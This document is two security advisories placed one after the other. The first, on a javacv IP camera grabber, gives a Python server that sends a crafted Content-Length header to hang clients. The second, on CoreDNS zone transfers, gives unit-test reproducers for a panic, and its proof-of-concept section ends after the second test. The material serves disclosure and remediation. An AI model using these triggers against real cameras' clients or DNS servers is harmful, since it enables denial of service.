### Summary
`IPCameraFrameGrabber` parses the `Content-Length` value from the multipart MJPEG HTTP stream returned by the configured IP camera without any bounds checking. A malicious or compromised camera endpoint - or any network attacker able to tamper with the plaintext HTTP response (these streams are conventionally accessed over `http://`, as documented in the class itself) - can supply a `Content-Length` value in the range `1073741825`-`2147483647`. This drives the internal buffer-growth routine `ensureBufferCapacity(int)` into 32-bit signed integer overflow, which turns the "grow the buffer" loop into a true infinite loop: the loop variable oscillates to `0` and never again satisfies the loop's exit condition. The thread that called `grab()`/`grabBufferedImage()` spins at 100% CPU forever and never returns, permanently hanging the calling application's frame-grabbing thread with no exception, timeout, or interrupt path available to the caller.

### Details
File: `src/main/java/org/bytedeco/javacv/IPCameraFrameGrabber.java`

```java
private byte[] readImage() throws IOException {
    ...
    int c0 = subheader.indexOf("content-length: ");
    final int c1 = subheader.indexOf('\r', c0);
    if (c0 < 0) {
        throw new EOFException("The camera stream ended unexpectedly");
    }
    c0 += 16;
    final int contentLength = Integer.parseInt(subheader.substring(c0, c1).trim());   // <-- fully attacker-controlled
    // adaptive size - careful - don't want a 2G jpeg
    ensureBufferCapacity(contentLength);                                              // <-- no upper bound enforced
    input.readFully(pixelBuffer, 0, contentLength);
    ...
}

private void ensureBufferCapacity(int desiredCapacity) {
    int capacity = pixelBuffer.length;          // starts at 1024
    while (capacity < desiredCapacity) {
        capacity *= 2;                          // <-- unchecked int multiplication
    }
    if (capacity > pixelBuffer.length) {
        pixelBuffer = new byte[capacity];
    }
}
```

`contentLength` is taken verbatim from the HTTP response headers of the camera stream and passed directly into `ensureBufferCapacity` with no upper-bound validation (the comment "adaptive size - careful - don't want a 2G jpeg" shows the author was aware of the risk but never implemented a check).

`ensureBufferCapacity` repeatedly doubles `capacity` (a 32-bit `int`, starting at `pixelBuffer.length == 1024`) until it is `>= desiredCapacity`. If `desiredCapacity` is greater than `2^30` (`1073741824`) but `<= Integer.MAX_VALUE` (`2147483647`):

1. `capacity` reaches `2^30` (`1073741824`) after 20 doublings; the loop condition `capacity < desiredCapacity` is still true.
2. `capacity *= 2` computes `2^31`, which overflows a signed 32-bit `int` and wraps to `Integer.MIN_VALUE` (`-2147483648`).
3. The loop condition `capacity < desiredCapacity` (a negative number compared to a large positive `desiredCapacity`) is still true, so the loop continues.
4. `capacity *= 2` computes `Integer.MIN_VALUE * 2`, which in two's-complement 32-bit arithmetic wraps to `0`.
5. From this point on, `capacity` is permanently `0` (`0 * 2 == 0`), and `0 < desiredCapacity` remains true forever - the `while` loop never terminates.

This is a pure CPU-bound loop with no I/O, no blocking call, and no `InterruptedException` check, so it cannot be interrupted via `Thread.interrupt()` and will not respect any `readTimeout`/`connectionTimeout` configured on the grabber (those only apply to the socket read that happens *before* this code path). The only remedy is killing the JVM/thread from outside.

### PoC
A minimal malicious/MITM'd MJPEG server that reproduces the hang:

```python
import socket

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", 8080))
srv.listen(1)
print("listening on :8080")
conn, _ = srv.accept()
conn.recv(4096)  # swallow the client's request

# Any value in (1073741824, 2147483647] triggers the overflow.
malicious_length = 2000000000
header = (
    "--myboundary\r\n"
    "Content-Type: image/jpeg\r\n"
    "Content-Length: %d\r\n\r\n" % malicious_length
)
conn.sendall(header.encode())
# The client will now spin forever inside ensureBufferCapacity()
# before ever attempting to read the (fake) body.
```

Java client (representative of any application embedding javacv to view an "IP camera" URL):

```java
import org.bytedeco.javacv.IPCameraFrameGrabber;
import java.util.concurrent.TimeUnit;

public class Poc {
    public static void main(String[] args) throws Exception {
        IPCameraFrameGrabber grabber = new IPCameraFrameGrabber(
            "http://127.0.0.1:8080/videostream.cgi", 5, 5, TimeUnit.SECONDS);
        grabber.start();
        grabber.grab(); // never returns; thread pegs a CPU core at 100% forever
    }
}
```

Running the client against the malicious server above causes `grab()` to hang permanently, consuming a full CPU core, regardless of the `startTimeout`/`grabTimeout` passed to the constructor.

### Impact
Any application that uses `IPCameraFrameGrabber` to consume a camera/MJPEG stream from a source that is not fully trusted - including the common case of plain `http://` streams (as shown in the class's own documented examples: `http://host/videostream.cgi?...`) that can be tampered with by a network-position attacker - can be forced into a permanent, unrecoverable CPU-spinning hang of the grabbing thread by a single crafted response header. No authentication, JPEG payload, or actual data transfer is required; the malicious header alone is sufficient. Repeated exploitation against a server that spawns a grabber thread per client/camera (a common pattern for video-surveillance/monitoring backends) can exhaust available threads/CPU, resulting in a broader denial of service.

### Summary

A network DNS client allowed to request AXFR for a CoreDNS zone can trigger a panic when CoreDNS is configured with `k8s_external` headless-service zone transfers and Kubernetes contains a headless service endpoint with no declared ports. The built-in `k8s_external` transferer can emit an empty `[]dns.RR` batch, and the shared `transfer` plugin indexes `records[0]` without checking that the batch is non-empty. In normal CoreDNS mode the panic is recovered and returned as `SERVFAIL`, but repeated triggering can disrupt requests and amplify panic logging; if the `debug` plugin disables recovery, the same path can crash the CoreDNS process.

### Details

`plugin/transfer/transfer.go` assumes that every `Transferer` emits only non-empty `[]dns.RR` batches. During AXFR/IXFR response generation it indexes `records[0]` without checking the slice length:

- `plugin/transfer/transfer.go:129-131`

```go
for records := range pchan {
    if x, ok := records[0].(*dns.SOA); ok && soa == nil {
        soa = x
    }
```

The built-in `k8s_external` transferer violates that contract for headless services whose endpoints have no declared ports. `plugin/k8s_external/transfer.go` sends the SRV result slice unconditionally:

- `plugin/k8s_external/transfer.go:104-106`

```go
recs, _ := e.srv(ctx, svcs, s)
ch <- recs
```

`plugin/k8s_external/msg_to_dns.go` intentionally skips services whose port is `-1`:

- `plugin/k8s_external/msg_to_dns.go:107-112`

```go
for _, s := range services {
    // Don't add the entry if the port is -1 (invalid). The kubernetes plugin uses port -1 when a service/endpoint
    // does not have any declared ports.
    if s.Port == -1 {
        continue
    }
```

The Kubernetes EndpointSlice conversion creates that sentinel when an EndpointSlice has no ports:

- `plugin/kubernetes/object/endpoint.go:62-66`

```go
if len(ends.Ports) == 0 {
    // Add sentinel if there are no ports.
    e.Subsets[0].Ports = []EndpointPort{{Port: -1}}
```

This creates a built-in source-to-sink chain:

1. Kubernetes EndpointSlice has ready addresses and no ports.
2. CoreDNS `kubernetes` converts it to an endpoint with `Port: -1`.
3. `k8s_external` with `headless` includes that service in transfer data.
4. `k8s_external.Transfer` sends an empty SRV `[]dns.RR` batch.
5. `transfer.ServeDNS` indexes `records[0]` and panics.

Suggested remediation:

1. In `plugin/transfer/transfer.go`, skip or reject empty `records` batches before indexing `records[0]`.
2. In `plugin/k8s_external/transfer.go`, only send `recs` when `len(recs) > 0` in the headless endpoint and port/protocol paths.
3. Add regression tests covering `Port: -1` headless services and empty transfer batches.

Example consumer-side guard:

```go
for records := range pchan {
    if len(records) == 0 {
        continue
    }
    if x, ok := records[0].(*dns.SOA); ok && soa == nil {
        soa = x
    }
    ...
}
```

### PoC

Safe local unit-level reproduction was performed. It does not contact external infrastructure and does not require a live Kubernetes cluster.

#### Reproducer A: the `transfer` sink panics on an empty batch

A temporary package test was added under `plugin/transfer`:

```go
package transfer

import (
    "context"
    "fmt"
    "testing"

    "github.com/coredns/coredns/plugin/pkg/dnstest"
    "github.com/coredns/coredns/plugin/test"

    "github.com/miekg/dns"
)

type auditEmptyBatchTransferer struct{}

func (auditEmptyBatchTransferer) Transfer(zone string, serial uint32) (<-chan []dns.RR, error) {
    if zone != "example.org." {
        return nil, ErrNotAuthoritative
    }
    ch := make(chan []dns.RR, 3)
    ch <- []dns.RR{test.SOA(fmt.Sprintf("%s 100 IN SOA ns.dns.%s hostmaster.%s %d 7200 1800 86400 100", zone, zone, zone, 1))}
    ch <- []dns.RR{}
    close(ch)
    return ch, nil
}

func TestAuditEmptyTransferBatchPanics(t *testing.T) {
    tr := &Transfer{
        Transferers: []Transferer{auditEmptyBatchTransferer{}},
        xfrs:        []*xfr{{Zones: []string{"example.org."}, to: []string{"*"}}},
    }

    req := new(dns.Msg)
    req.SetQuestion("example.org.", dns.TypeAXFR)
    rec := dnstest.NewRecorder(&test.ResponseWriter{TCP: true})

    defer func() {
        if rec := recover(); rec == nil {
            t.Fatal("expected empty transfer batch to panic")
        }
    }()

    _, _ = tr.ServeDNS(context.Background(), rec, req)
}
```

Verification command and result:

```text
$ go test ./plugin/transfer -run TestAuditEmptyTransferBatchPanics -count=1 -v
=== RUN   TestAuditEmptyTransferBatchPanics
--- PASS: TestAuditEmptyTransferBatchPanics (0.00s)
PASS
ok  	github.com/coredns/coredns/plugin/transfer	0.005s
```

#### Reproducer B: the built-in `k8s_external` transferer emits the empty batch

A temporary package test was added under `plugin/k8s_external`:

```go
package external

import (
    "testing"
    "time"

    "github.com/coredns/coredns/plugin/etcd/msg"
    "github.com/coredns/coredns/plugin/kubernetes"
    "github.com/coredns/coredns/request"

    "github.com/miekg/dns"
)

func TestAuditHeadlessNoPortTransferEmitsEmptyBatch(t *testing.T) {
    e := New()
    e.Zones = []string{"example.com."}
    e.headless = true
    e.externalAddrFunc = func(request.Request, bool) []dns.RR { return nil }
    e.externalSerialFunc = func(string) uint32 { return 1 }
    e.externalServicesFunc = func(string, bool) ([]msg.Service, map[string][]msg.Service) {
        return nil, map[string][]msg.Service{
            "/coredns/com/example/testns/headless/" + kubernetes.Endpoint: {{Host: "192.0.2.10", Port: -1, TTL: 5, Key: "/coredns/com/example/testns/headless/endpoint-a"}},
        }
    }

    ch, err := e.Transfer("example.com.", 0)
    if err != nil {
        t.Fatalf("Transfer returned error: %v", err)
    }

    deadline := time.After(time.Second)
    for {
        select {
        case batch, ok := <-ch:
            if !ok {
                t.Fatal("transfer closed before emitting an empty batch")
            }
            if len(batch) == 0 {
                return
            }
        case <-deadline:
            t.Fatal("timed out waiting for an empty batch")
        }
    }
}
```

